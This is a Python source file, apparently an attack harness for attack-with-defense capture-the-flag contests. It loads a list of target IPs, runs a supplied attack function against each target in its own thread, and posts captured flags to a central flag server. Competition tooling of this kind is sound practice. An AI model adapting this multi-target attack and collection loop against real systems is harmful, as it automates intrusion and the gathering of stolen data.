#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2020/9/17 09:41
# @Author  : Dawnnnnnn
# @Contact: 1050596704@qq.com
import requests
import hashlib
import base64
from loguru import logger
from config.config import receive_flag_server
import threading
import time
import hmac
import gzip
import os

logger.add('log.txt')


# 常见加解密类
class Utils:
    def __init__(self):
        pass

    @staticmethod
    def md5_encode(strings):
        hash = hashlib.md5()
        hash.update(strings.encode('utf-8'))
        md5_sign = hash.hexdigest()
        return md5_sign

    @staticmethod
    def sha1_encode(strings):
        hash = hashlib.sha1()
        hash.update(strings.encode('utf-8'))
        sha1_sign = hash.hexdigest()
        return sha1_sign

    @staticmethod
    def sha256_encode(strings):
        hash = hashlib.sha256()
        hash.update(strings.encode('utf-8'))
        sha256_sign = hash.hexdigest()
        return sha256_sign

    @staticmethod
    def hmac_sha256(strings, key):
        return hmac.new(key.encode(), strings.encode(), digestmod=hashlib.sha256).hexdigest()

    @staticmethod
    def hmac_sha1(strings, key):
        return hmac.new(key.encode(), strings.encode(), digestmod=hashlib.sha1).hexdigest()

    @staticmethod
    def b64dec(strings):
        return base64.b64decode(str(strings))

    @staticmethod
    def b64enc(strings):
        return base64.b64encode(strings.encode())

    @staticmethod
    def b32dec(strings):
        return base64.b32decode(str(strings))

    @staticmethod
    def b32enc(strings):
        return base64.b32encode(strings.encode())

    @staticmethod
    def b16dec(strings):
        return base64.b16decode(str(strings))

    @staticmethod
    def b16enc(strings):
        return base64.b16encode(strings.encode())

    @staticmethod
    def gzip_decompress(strings):
        return gzip.decompress(strings.encode())

    @staticmethod
    def gzip_compress(strings):
        return gzip.compress(strings.encode())


# 覆盖requests.session的类
class Session:
    def __init__(self):
        self.ses = requests.session()

    def post(self, url, data=None, json=None, **kwargs):
        try:
            return self.ses.post(url, data=data, json=json, timeout=5, **kwargs)
        except BaseException as e:
            logger.error(f"[{url}]请求失败，原因:{e}")

    def get(self, url, **kwargs):
        try:
            return self.ses.get(url, timeout=5, **kwargs)
        except BaseException as e:
            logger.error(f"[{url}]请求失败，原因:{e}")

    def put(self, url, **kwargs):
        try:
            return self.ses.put(url, timeout=5, **kwargs)
        except BaseException as e:
            logger.error(f"[{url}]请求失败，原因:{e}")


# 多线程攻击类
class Attack:
    def __init__(self, target_file):
        if os.path.exists(target_file):
            pass
        else:
            exit(f'当前目录下没找到{target_file}')
        self.ips = []
        self.__get_ips(target_file)

    def __get_ips(self, target_file):
        """
        ip:port
        example:
            10.254.11.123:8080
            10.254.11.125:5555
        """
        with open(target_file, "r")as f:
            for target in f.readlines():
                target = target.strip()
                self.ips.append(target)

    @staticmethod
    def __generate_flag_json(ip, flag):
        json = {
            "ip": ip,
            "flag": flag,
            "time": int(time.time() * 1000)
        }
        return json

    def trans_flag(self, ip, flag, headers=None):
        json = self.__generate_flag_json(ip, flag)
        url = f"http://{receive_flag_server}/flag"
        if not headers:
            headers = {
                "User-Agent": "AwdAttackFramework/1.0.0",
                "Cookie": ""
            }
        response = requests.post(url, headers=headers, json=json, timeout=2)
        if response.status_code == 200:
            logger.info(f"{json}传输到中心flag服务器正常")
        else:
            logger.error(f"{json}传输到中心flag服务器异常!，请手动排查{response.text}")

    def attack(self, func):
        logger.debug(self.ips)
        for i in range(0, len(self.ips)):
            try:
                logger.info(f'当前攻击进度{i}/{len(self.ips)}，攻击ip为{self.ips[i]}')
                t = threading.Thread(target=func, args=(self.ips[i],))
                t.start()
            except BaseException:
                pass
